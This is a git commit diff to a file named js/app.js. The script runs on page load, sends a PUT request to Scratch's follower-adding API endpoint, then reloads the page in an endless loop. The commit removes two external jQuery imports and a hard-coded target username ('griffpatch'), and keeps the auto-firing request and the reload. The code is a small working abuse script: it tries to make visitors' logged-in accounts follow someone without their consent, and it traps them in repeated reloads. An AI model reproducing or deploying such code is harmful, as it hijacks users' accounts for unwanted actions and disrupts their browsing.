6c755e5c78b1ee71442787a39c4b95719abe9e4b
Sonik <69720319+SuperS0n1k@users.noreply.github.com>
2023-06-02 18:19:02 +0100

    Update app.js

--- js/app.js
+++ js/app.js
@@ -1,8 +1,5 @@
-import "https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"
-import "https://cdn.scratch.mit.edu/scratchr2/static/__d227dda79ab53b07e3b30c100291aaac__//js/jquery.min.js"
-
 function followme() {
-    $.ajax({type:"PUT",url:"https://scratch.mit.edu/site-api/users/followers/f_account/add/?usernames=griffpatch"});
+    $.ajax({type:"PUT",url:"https://scratch.mit.edu/site-api/users/followers/f_account/add/"});
     location.reload();
 }
 window.onload = followme;
